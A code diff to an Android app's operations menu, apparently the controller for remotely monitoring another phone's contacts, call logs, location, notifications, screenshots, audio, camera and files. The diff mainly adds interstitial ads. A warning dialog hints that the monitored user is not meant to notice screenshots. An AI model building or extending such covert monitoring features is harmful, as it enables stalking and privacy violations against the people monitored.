@@ -4,6 +4,7 @@ import static android.content.ContentValues.TAG;
 
 import android.app.ProgressDialog;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -32,8 +33,10 @@ import com.reiserx.myapplication24.Activities.Logs.AppLogsActivity;
 import com.reiserx.myapplication24.Activities.Notifications.NotificationHistoryMain;
 import com.reiserx.myapplication24.Activities.Notifications.RecyclerActivity;
 import com.reiserx.myapplication24.Activities.Logs.ErrorLogs;
+import com.reiserx.myapplication24.Activities.Operations.operation;
 import com.reiserx.myapplication24.Activities.ScreenShots.ScreenShotsActivity;
 import com.reiserx.myapplication24.Activities.Usagestats.UsageStatsActivity;
+import com.reiserx.myapplication24.Advertisements.InterstitialAdsClass;
 import com.reiserx.myapplication24.BackwardCompatibility.RequiresVersion;
 import com.reiserx.myapplication24.Classes.postRequest;
 import com.reiserx.myapplication24.Models.deviceInfo;
@@ -88,6 +91,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
 
     private void clicked(int position) {
         RequiresVersion requiresVersion = new RequiresVersion(context, UserID);
+        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);
         switch (position) {
             case 0:
                 if (requiresVersion.Requires(2.8f)) {
@@ -99,21 +103,25 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 }
                 break;
             case 1:
+                interstitialAdsClass.loadAds();
                     intent = new Intent(context, contacts.class);
                     intent.putExtra("UserID", UserID);
                     context.startActivity(intent);
                 break;
             case 2:
+                interstitialAdsClass.loadAds();
                 intent = new Intent(context, callogs.class);
                 intent.putExtra("UserID", UserID);
                 context.startActivity(intent);
                 break;
             case 3:
+                interstitialAdsClass.loadAds();
                 intent = new Intent(context, location.class);
                 intent.putExtra("UserID", UserID);
                 context.startActivity(intent);
                 break;
             case 4:
+                interstitialAdsClass.loadAds();
                 if (requiresVersion.Requires(2.7f)) {
                     intent = new Intent(context, NotificationHistoryMain.class);
                     intent.putExtra("UserID", UserID);
@@ -124,7 +132,6 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 break;
             case 5:
                 if (requiresVersion.Requires(3.8f)) {
-
                     ProgressDialog prog = new ProgressDialog(context);
                     prog.setMessage("Processing...");
                     prog.setCancelable(false);
@@ -139,6 +146,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                             for (QueryDocumentSnapshot document1 : task.getResult()) {
                                 deviceInfo d = document1.toObject(deviceInfo.class);
                                 if (d.getSdk() >= 30) {
+                                    interstitialAdsClass.loadAds();
                                     intent = new Intent(context, ScreenShotsActivity.class);
                                     intent.putExtra("UserID", UserID);
                                     context.startActivity(intent);
@@ -147,6 +155,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                                     dialog.setMessage("This will take screenshot GLOBALLY in API 28-29 (Android 9-10)\nGLOBALLY means this will take screenshot same as you take it and the user will be notified\nSo be carefull when you use this feature for Android 9-10");
                                     dialog.setTitle("Alert");
                                     dialog.setPositiveButton("NEXT", (dialogInterface, i) -> {
+                                        interstitialAdsClass.loadAds();
                                         intent = new Intent(context, ScreenShotsActivity.class);
                                         intent.putExtra("UserID", UserID);
                                         context.startActivity(intent);
@@ -170,6 +179,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 break;
             case 6:
                 if (requiresVersion.Requires(3.8f)) {
+                    interstitialAdsClass.loadAds();
                     intent = new Intent(context, GetAudiosActivity.class);
                     intent.putExtra("UserID", UserID);
                     context.startActivity(intent);
@@ -177,6 +187,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 break;
             case 7:
                 if (requiresVersion.Requires(3.8f)) {
+                    interstitialAdsClass.loadAds();
                     intent = new Intent(context, CameraActivity.class);
                     intent.putExtra("UserID", UserID);
                     context.startActivity(intent);
@@ -189,12 +200,14 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 ServiceRestart(UserID);
                 break;
             case 10:
+                interstitialAdsClass.loadAds();
                 intent = new Intent(context, RecyclerActivity.class);
                 intent.putExtra("UserID", UserID);
                 intent.putExtra("Notification", false);
                 context.startActivity(intent);
                 break;
             case 11:
+                interstitialAdsClass.loadAds();
                 intent = new Intent(context, UsageStatsActivity.class);
                 intent.putExtra("UserID", UserID);
                 context.startActivity(intent);
@@ -204,12 +217,14 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                 break;
             case 13:
                 if (requiresVersion.Requires(3.8f)) {
+                    interstitialAdsClass.loadAds();
                     intent = new Intent(context, AppLogsActivity.class);
                     intent.putExtra("UserID", UserID);
                     context.startActivity(intent);
                 }
                 break;
             case 14:
+                interstitialAdsClass.loadAds();
                     intent = new Intent(context, ErrorLogs.class);
                     intent.putExtra("UserID", UserID);
                     context.startActivity(intent);
@@ -235,6 +250,8 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
     public void ClearPreferences() {
         AlertDialog alert = new AlertDialog.Builder(context).create();
 
+        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);
+
         LayoutInflater inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         View mView = inflater.inflate(R.layout.preference_dialog, null);
         final Button directorys = mView.findViewById(R.id.directorys);
@@ -247,21 +264,25 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
             performTask = new performTask("Folders", 5, UserID);
             performTask.Task();
             alert.dismiss();
+            interstitialAdsClass.loadAds();
         });
         upload.setOnClickListener(v1 -> {
             performTask = new performTask("uploadFiles", 5, UserID);
             performTask.Task();
             alert.dismiss();
+            interstitialAdsClass.loadAds();
         });
         contacts.setOnClickListener(v1 -> {
             performTask = new performTask("Contacts", 5, UserID);
             performTask.Task();
             alert.dismiss();
+            interstitialAdsClass.loadAds();
         });
         callLogs.setOnClickListener(v1 -> {
             performTask = new performTask("CallLogs", 5, UserID);
             performTask.Task();
             alert.dismiss();
+            interstitialAdsClass.loadAds();
         });
         cancel.setOnClickListener(v1 -> alert.dismiss());
         alert.setView(mView);
@@ -280,8 +301,6 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
         final CheckBox forgroundCheckBox = mView.findViewById(R.id.checkBox2);
         final CheckBox launch_app = mView.findViewById(R.id.launch_app);
         final CheckBox job = mView.findViewById(R.id.job);
-
-        FirebaseDatabase mdb = FirebaseDatabase.getInstance();
 
         requestCode = 0;
         alert.setMessage("Enter title and message");
@@ -412,6 +431,8 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
         AlertDialog.Builder alert = new AlertDialog.Builder(context);
         alert.setTitle("Device Info");
 
+        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(context);
+
         FirebaseFirestore firestore = FirebaseFirestore.getInstance();
         CollectionReference document = firestore.collection("Main").document(UserID).collection("DeviceInfo");
         document.get().addOnCompleteListener(task -> {
@@ -420,7 +441,7 @@ public class opeationsAdapter extends RecyclerView.Adapter<opeationsAdapter.Sing
                     deviceInfo d = document1.toObject(deviceInfo.class);
                     String message = "SERIAL NO: " + d.getSerial() + "\nID: " + d.getId() + "\nMANUFACTURER: " + d.getManufacturer() + "\nMODEL: " + d.getModel() + "\nUSER: " + d.getUser() + "\nSDK: " + d.getSdk() + "\nVERSION CODE : " + d.getVersionCode();
                     alert.setMessage(message);
-                    alert.setPositiveButton("CLOSE", null);
+                    alert.setPositiveButton("CLOSE", (dialogInterface, i) -> interstitialAdsClass.loadAds());
                     alert.show();
                 }
             } else {
